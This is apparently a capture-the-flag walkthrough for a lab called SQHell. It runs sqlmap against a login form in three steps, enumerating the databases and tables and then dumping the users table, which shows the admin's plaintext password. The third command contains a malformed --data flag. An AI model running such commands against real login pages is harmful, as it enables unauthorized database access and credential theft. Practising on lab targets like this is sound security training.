#1 To know which tables are exist and available
``` 
sqlmap -u "http://<IP-Target>/login" --data="username=admin&password=admin" --batch --dbs
```

Result: 
available databases [2]:
[*] information_schema
[*] sqhell_2


#2 Check sqhell_2 tables 

```
sqlmap -u "http://<IP-Target>/login" --data="username=admin&password=admin" -D sqhell_2 --tables --batch
```

Result:

adjusting time delay to 3 seconds due to good response times
users
Database: sqhell_2
[1 table]
+-------+
| users |
+-------+

#3 Lets see what is the inside 'users' table

```
sqlmap -u "http://<IP_TARGET>/login" --data"=username=admin&password=admin" -D sqhell_2 -T users --dump --batch
```

Database: sqhell_2
Table: users
[1 entry]
+----+---------------------------------+----------+
| id | password                        | username |
+----+---------------------------------+----------+
| 1  | icantrememberthispasswordcanyou | admin    |
+----+---------------------------------+----------+

